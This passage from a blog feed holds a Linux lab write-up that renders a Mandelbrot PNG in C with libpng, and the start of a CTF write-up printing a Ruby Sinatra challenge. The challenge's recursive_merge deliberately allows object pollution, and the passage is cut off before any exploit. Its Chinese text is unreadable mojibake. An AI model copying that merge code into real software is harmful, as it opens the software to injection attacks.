punctuation">)</span><span class="token punctuation">;</span>    png_structp png <span class="token operator">=</span>        <span class="token function">png_create_write_struct</span><span class="token punctuation">(</span>PNG_LIBPNG_VER_STRING<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_infop info <span class="token operator">=</span> <span class="token function">png_create_info_struct</span><span class="token punctuation">(</span>png<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_init_io</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_set_IHDR</span><span class="token punctuation">(</span>        png<span class="token punctuation">,</span>        info<span class="token punctuation">,</span>        width<span class="token punctuation">,</span>        height<span class="token punctuation">,</span>        <span class="token number">8</span><span class="token punctuation">,</span>        color_type<span class="token punctuation">,</span>        PNG_INTERLACE_NONE<span class="token punctuation">,</span>        PNG_COMPRESSION_TYPE_DEFAULT<span class="token punctuation">,</span>        PNG_FILTER_TYPE_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_info</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_image</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_end</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_destroy_write_struct</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>png<span class="token punctuation">,</span> <span class="token operator">&amp;</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//===Mandelbrot ï¿½ï¿½ï¿½ï¿½Í¼ï¿½ï¿½ </span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">RD</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">47</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">GR</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">47</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BL</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">128</span><span class="token operator">-</span><span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">23</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_uint_32 x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    png_uint_32 png_size <span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"using defalut 1024,you can input png_size,usage:  %s png_size\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                png_size <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            png_size <span class="token operator">=</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>           <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>math_png_rgb  <span class="token operator">=</span> <span class="token string">"math_png_rgb.png"</span><span class="token punctuation">;</span>    pixel_RGB  <span class="token operator">*</span>image_data_rgb <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>png_size <span class="token operator">*</span> png_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pixel_RGB<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pixel_RGB <span class="token operator">*</span><span class="token operator">*</span>row_ptrs_rgb   <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>png_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pixel_RGB <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> y<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> png_size<span class="token punctuation">;</span> y<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>image_data_rgb<span class="token punctuation">[</span>y <span class="token operator">*</span> png_size<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> png_size<span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>red   <span class="token operator">=</span> <span class="token function">RD</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>green <span class="token operator">=</span> <span class="token function">GR</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>black <span class="token operator">=</span> <span class="token function">BL</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write_data_to_png</span><span class="token punctuation">(</span>        math_png_rgb<span class="token punctuation">,</span>        png_size<span class="token punctuation">,</span>        png_size<span class="token punctuation">,</span>        <span class="token punctuation">(</span>png_bytepp<span class="token punctuation">)</span>row_ptrs_rgb<span class="token punctuation">,</span>        PNG_COLOR_TYPE_RGB<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>row_ptrs_rgb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>image_data_rgb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥ç¼–è¯‘ä¼šæŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel6 ex7<span class="token punctuation">]</span><span class="token comment"># gcc -o math_pix_png math_pix_png.c </span>math_pix_png.c: åœ¨å‡½æ•°â€˜RDâ€™ä¸­:math_pix_png.c:55: è­¦å‘Šï¼šéšå¼å£°æ˜ä¸å†…å»ºå‡½æ•°â€˜logâ€™ä¸å…¼å®¹math_pix_png.c: åœ¨å‡½æ•°â€˜GRâ€™ä¸­:math_pix_png.c:60: è­¦å‘Šï¼šéšå¼å£°æ˜ä¸å†…å»ºå‡½æ•°â€˜logâ€™ä¸å…¼å®¹math_pix_png.c: åœ¨å‡½æ•°â€˜BLâ€™ä¸­:math_pix_png.c:65: è­¦å‘Šï¼šéšå¼å£°æ˜ä¸å†…å»ºå‡½æ•°â€˜logâ€™ä¸å…¼å®¹/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>write_data_to_png':math_pix_png.c:<span class="token punctuation">(</span>.text+0x5b<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_create_write_struct<span class="token string">'math_pix_png.c:(.text+0x69): undefined reference to `png_create_info_struct'</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0x7e<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>png_init_io'math_pix_png.c:<span class="token punctuation">(</span>.text+0xc5<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_set_IHDR<span class="token string">'math_pix_png.c:(.text+0xd7): undefined reference to `png_write_info'</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0xe9<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>png_write_image'math_pix_png.c:<span class="token punctuation">(</span>.text+0xfc<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_write_end<span class="token string">'math_pix_png.c:(.text+0x10e): undefined reference to `png_destroy_write_struct'</span>/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>RD':math_pix_png.c:<span class="token punctuation">(</span>.text+0x1c7<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>log<span class="token string">'/tmp/ccPI6QFP.o: In function `GR'</span><span class="token builtin class-name">:</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0x297<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>log'/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable">`</span></span>BL<span class="token string">':math_pix_png.c:(.text+0x367): undefined reference to `log'</span>collect2: ld è¿”å› <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾ç¼ºå¤´æ–‡ä»¶äº†ï¼Œåœ¨ c æ–‡ä»¶å¤´éƒ¨å¼•å…¥ä¸€ä¸ª<code>&lt;math.h&gt;</code>ï¼Œç„¶åéœ€è¦é“¾æ¥ libpng åº“è¿›è¡Œç¼–è¯‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> math_pix_png math_pix_png.c <span class="token parameter variable">-lpng</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203215652654.png" alt="image-20241203215652654"></p><hr><h2 id="å®éªŒ2"><a href="#å®éªŒ2" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h2><ol><li><p>ä½¿ç”¨gccå‘½ä»¤æŠŠhello-c.tar.gzä¸­çš„hello.cç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºhelloï¼Œè¿è¡ŒæŸ¥çœ‹æ•ˆæœï¼Œå¹¶ä½¿ç”¨lddå‘½ä»¤æŸ¥çœ‹helloè°ƒç”¨çš„ç›¸å…³å¤–éƒ¨å‡½æ•°åº“ä¿¡æ¯ã€ä½¿ç”¨fileå‘½ä»¤æŸ¥çœ‹helloçš„ä¿¡æ¯ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/141.jpg" alt="img"></p></li><li><p>æŠŠç¬¬ä¸€æ­¥ç¼–è¯‘ç”Ÿæˆçš„å¯æ‰§è¡Œç¨‹åºhelloåˆ é™¤ï¼ŒæŸ¥çœ‹ç¼–è¯‘hello.cå¯¹åº”çš„Makefileï¼Œä½¿ç”¨makeå·¥å…·ç¼–è¯‘è¯¥ç¨‹åºï¼Œæ£€æŸ¥ç¼–è¯‘ç»“æœã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/151.jpg" alt="img"></p></li><li><p>è§£å‹å¹¶ä½¿ç”¨makeå‘½ä»¤ç¼–è¯‘math-c.tar.gzä»£ç ï¼Œé˜…è¯»è¯¥å‹ç¼©åŒ…ä¸­çš„Makefileï¼Œå°è¯•ç›´æ¥ä½¿ç”¨gccå‘½ä»¤æŠŠmathtest.cç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºmathsqrtdemo</p></li></ol><p>   <img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/161.jpg" alt="img"></p><ol start="4"><li><p>ä½¿ç”¨rpm -qæŸ¥è¯¢sqliteå‡½æ•°åº“ä»¥åŠsqliteå¼€å‘åº“æ˜¯å¦å·²ç»å®‰è£…ï¼Œå¦‚æœæ²¡æœ‰å®‰è£…ï¼Œè¯·ä»å…‰ç›˜å®‰è£…sqliteå‡½æ•°åº“åŠå…¶å¼€å‘åŒ…å¯¹åº”çš„rpmæ–‡ä»¶ï¼Œå¹¶æŸ¥è¯¢è¿™2ä¸ªrpmè½¯ä»¶å®‰è£…åŒ…å‘Linuxç³»ç»Ÿå®‰è£…äº†å“ªäº›æ–‡ä»¶ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps17.jpg" alt="img"></p></li><li><p>ç¼–è¯‘è°ƒç”¨äº†è½»é‡çº§æ•°æ®åº“sqlite3å‡½æ•°åº“çš„Cç¨‹åºä»£ç ã€‚<br>sqlite-test-2ç›®å½•ä¸­çš„æºç æ–‡ä»¶sqlite-test.cä¸ºä¸€ä¸ªä½¿ç”¨Cè¯­è¨€ç»“åˆsqlite apiç¼–å†™çš„sqlite3æ•°æ®åº“è®¿é—®ç¨‹åº</p><ul><li><p>ä½¿ç”¨makeå‘½ä»¤ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œç¨‹åº<br>æç¤ºï¼šç¼–è¯‘æˆåŠŸåï¼ŒæŒ‰â€œsqlite-test  a.dbâ€æ ¼å¼è¿è¡Œè¯¥ç¨‹åºï¼ŒæŸ¥çœ‹è¿è¡Œæ•ˆæœ</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps18.jpg" alt="img"></p></li><li><p>é˜…è¯»åˆ†æsqlite-test.cå¯¹åº”çš„Makefileæ–‡ä»¶ï¼Œç†è§£pkg-configå‘½ä»¤çš„ä½œç”¨</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps19.jpg" alt="img"></p><p> pkg-config çš„ä½œç”¨æ˜¯å¸®åŠ© gcc å‘½ä»¤è·å–å…³äº SQLite3 åº“çš„ç¼–è¯‘å’Œé“¾æ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬éœ€è¦æ·»åŠ çš„å¤´æ–‡ä»¶è·¯å¾„å’Œåº“æ–‡ä»¶è·¯å¾„</p></li><li><p>ä½¿ç”¨make cleanæ¸…é™¤ç°æœ‰çš„ç¼–è¯‘æˆåŠŸçš„å¯æ‰§è¡Œç¨‹åºsqlite-test</p></li></ul><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps20.jpg" alt="img"></p><ul><li><p>é˜…è¯»sqlite-test-demo.tar.gzå‹ç¼©åŒ…ä¸­çš„Makefileï¼Œå¯¹æ¯”ä¸¤ä¸ªç‰ˆæœ¬çš„Makefileçš„å†™æ³•å·®å¼‚ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps21.jpg" alt="img"></p><p><code>-lsqlite3</code> é€‰é¡¹ä¼šç›´æ¥é“¾æ¥ SQLite3 åº“</p><p>å‰è€…ä½¿ç”¨ <code>pkg-config --cflags --libs sqlite3</code> æ¥è·å– SQLite3 åº“çš„ç¼–è¯‘å’Œé“¾æ¥ä¿¡æ¯</p></li></ul></li><li><p>å°è¯•ç¼–è¯‘ hello-gtk-2.0ç›®å½•ä¸­çš„ä»£ç å¹¶è¿è¡Œï¼Œé˜…è¯»å¹¶ç†è§£è¯¥ä»£ç åŠå…¶Makefileæ–‡ä»¶</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps22.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps23.jpg" alt="img"></p><p>è¿™ä¸ª Makefile æ–‡ä»¶çš„ä½œç”¨æ˜¯ç¼–è¯‘ hello-gtk2.c æ–‡ä»¶ï¼Œå¹¶é“¾æ¥ gtk+-2.0 åº“ï¼Œä»¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ hello-gtk2ã€‚ä½¿ç”¨ pkg-config å¯ä»¥æ–¹ä¾¿åœ°è·å–æ‰€éœ€åº“çš„ç¼–è¯‘å’Œé“¾æ¥ä¿¡æ¯</p></li><li><p>aes-demo.tar.gzæ˜¯ä¸€ä¸ªè°ƒç”¨opensslåº“è¿›è¡ŒaesåŠ å¯†è§£å¯†çš„Cæºä»£ç ï¼Œå°è¯•ç¼–è¯‘è¿è¡Œè¯¥ä»£ç ï¼Œå¹¶é˜…è¯»Makefileæ–‡ä»¶ï¼Œåˆ†æå…¶ç¼–è¯‘gccå‘½ä»¤ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps24.jpg" alt="img"></p><p>gccå‘½ä»¤ä¸­ç”¨ <code>-l</code> é“¾æ¥ ssl åº“å’Œ crypto åº“</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœŸæœ«è‡ªæŸ¥ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN&amp;CCB2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/15/CISCN-CCB2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/15/CISCN-CCB2024/</id>
    <published>2024-12-15T01:15:16.000Z</published>
    <updated>2024-12-23T18:31:25.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€è§‰é†’æ¥NISAå®åŠ›ä¸‹é™ä¸€ä¸‡å€ï¼Œå“ˆå“ˆä¸¤äººé€€å½¹ä¹‹åæˆ‘ä»¬å®Œè›‹äº†</p><p>è¿™b webçœŸæ˜¯ä¸€å¤©æ¯”ä¸€å¤©éš¾æ‰“äº†ï¼Œæ¢­å“ˆåŠå¤©æ‹¿ä¸ä¸‹å°‘è§£é¢˜ï¼Œå…¶ä»–é¢˜å›å¤´å°±è¢«æ‰“çƒ‚</p><p>å­¦webæ•‘ä¸äº†NISAï¼Œå”‰æˆ‘å¥½èœå•ŠğŸ˜­</p><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/16750">https://xz.aliyun.com/t/16750</a></p><p><a href="https://xz.aliyun.com/t/16792">https://xz.aliyun.com/t/16792</a></p><span id="more"></span><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215231840744.png" alt="image-20241215231840744"></p><hr><h1 id="ezrubyï¼ˆUnsolvedï¼‰"><a href="#ezrubyï¼ˆUnsolvedï¼‰" class="headerlink" title="ezrubyï¼ˆUnsolvedï¼‰"></a>ezrubyï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># frozen_string_literal: true</span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'json'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/base'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'net/http'</span></span><span class="token keyword">class</span> <span class="token class-name">Person</span>  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>    <span class="token variable">@name</span> <span class="token operator">=</span> name    <span class="token variable">@age</span> <span class="token operator">=</span> age    <span class="token variable">@details</span> <span class="token operator">=</span> details  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>    <span class="token variable">@@url</span>  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">merge_with</span></span><span class="token punctuation">(</span>additional<span class="token punctuation">)</span>    recursive_merge<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> additional<span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">private</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>    additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>      <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>          next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>          recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>        <span class="token keyword">else</span>          new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key        <span class="token keyword">end</span>      <span 